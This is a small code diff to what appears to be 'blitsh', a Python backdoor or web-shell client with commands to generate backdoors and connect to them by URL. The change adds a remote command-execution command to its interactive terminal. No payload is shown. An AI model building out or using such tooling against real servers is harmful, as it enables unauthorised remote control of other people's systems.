@@ -6,6 +6,7 @@ import click
 from blitsh import backdoors
 from blitsh.terminal import Terminal
 from blitsh.client import Client
+from blitsh.commands.exec import ExecCommand
 
 
 @click.group()
@@ -25,5 +26,5 @@ def generate(path):
 @click.argument('url', metavar='URL', type=str)
 def connect(url):
     client = Client(url)
-    terminal = Terminal(client)
+    terminal = Terminal(client, [ExecCommand()])
     terminal.cmdloop()
